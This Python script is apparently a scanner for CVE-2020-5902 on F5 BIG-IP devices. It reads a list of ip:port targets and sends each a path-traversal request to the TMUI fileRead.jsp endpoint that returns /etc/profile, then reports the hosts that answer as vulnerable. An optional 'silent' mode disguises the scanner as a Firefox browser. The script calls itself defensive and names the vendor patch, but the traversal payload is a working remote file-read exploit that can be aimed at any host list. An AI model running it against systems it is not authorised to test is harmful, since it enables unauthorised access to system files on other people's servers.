from termcolor import colored
import requests
import argparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

my_parser = argparse.ArgumentParser(description='Checker for CVE-2020-5902', epilog='Only for defensive purpouses')
my_parser.add_argument('mode',
                       metavar='mode',
                       type=str,
                       help='Silent or signed User-Agent',
                       choices=['silent', 'signed'],
                       default='signed')

my_parser.add_argument('list',
                       metavar='list',
                       type=str,
                       help='List with targets. ip:port. 1 per line',
                       )

my_parser.add_argument('timeout',
                       metavar='timeout',
                       type=int,
                       help='Timeout for requests (in seconds)',
                       )

args = my_parser.parse_args()
mode = args.mode
lista = args.list
tiempo = args.timeout


if mode == 'signed':
	ua = 'CVE-2020-5902 Checker. It reads profile from etc'
else:
	ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0'

headers = {
	'User-Agent':ua
}

f = open(lista, 'r')
lineas = f.readlines()
f.close()
v = 0
print(colored('[?] Targets loaded: ' + str(len(lineas)), 'blue'))

def check(host, port):
    target = 'https://' + host + ':' + str(port) + '/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/profile'
    #print(target)
    r = requests.get(target, headers=headers, verify=False, timeout=tiempo)
    if r.text.find('System wide environment and startup programs') != -1:
        print(colored('[-] ' + host + ':' + str(port) + ' is vulnerable to CVE-2020-5902', 'red'))
        print(colored('[?] Patch with K52145254', 'yellow'))
        global v
        v = v + 1
    else:
        print(colored('[+] ' + host + ':' + str(port) + ' is patched', 'green'))

for linea in lineas:
    linea.encode("utf-8")
    linea = linea.split(':')
    host = linea[0]
    port = linea[1].replace('\n','')
    check(host, port)

print(colored('[?] ' + colored(str(v),'red') + ' targets are vulnerable. ' + colored(str(round(v * 100 / len(lineas))) + '%', 'red'), 'blue'))
print(colored('[?] More vulnerability POCs at https://github.com/SadFud/Exploits', 'yellow'))